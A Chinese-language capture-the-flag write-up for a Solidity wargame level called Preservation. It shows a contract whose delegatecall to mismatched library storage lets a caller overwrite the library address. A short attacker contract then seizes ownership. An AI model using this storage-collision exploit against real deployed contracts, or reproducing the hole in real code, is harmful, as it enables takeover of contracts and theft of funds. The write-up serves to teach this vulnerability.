# 16 - Preservation

## 题目
攻击以下合约
```solidity
//该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。
//
//通关条件：尝试取得合约的所有权（owner）。
//
//可能有帮助的注意点：
//
//深入了解 Solidity 官网文档中底层方法 delegatecall 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。
//理解 delegatecall 的上下文保留的含义
//理解合约中的变量是如何存储和访问的
//理解不同类型之间的如何转换
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
// public library contracts
address public timeZone1Library;
address public timeZone2Library;
address public owner;
uint256 storedTime;
// Sets the function signature for delegatecall
bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
timeZone1Library = _timeZone1LibraryAddress;
timeZone2Library = _timeZone2LibraryAddress;
owner = msg.sender;
}

// set the time for timezone 1
function setFirstTime(uint256 _timeStamp) public {
timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}

// set the time for timezone 2
function setSecondTime(uint256 _timeStamp) public {
timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
}

// Simple library contract to set the time
contract LibraryContract {
// stores a timestamp
uint256 storedTime;

function setTime(uint256 _time) public {
storedTime = _time;
}
}
```

## 解题
本题考察点：
delegatecall 与 call 不同的地方在于调用目标合约后，目标合约对 存储的改变，会改变对应位置的最初合约的存储，所以，通过在setFirstTime函数的调用中，
传入攻击合约的地址作为参数，将使 timeZone1Library 的地址变为攻击合约，再次运行 setFirstTime 将执行攻击合约中的 setTime 函数，合约如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Simple library contract to set the time
contract hackContract {
    // stores a timestamp
    uint256 storedTime;
    uint256 storedTime2;
    address public owner;

    function setTime(uint256 _time) public {
        storedTime = _time;
        owner = tx.origin;
    }
}
```


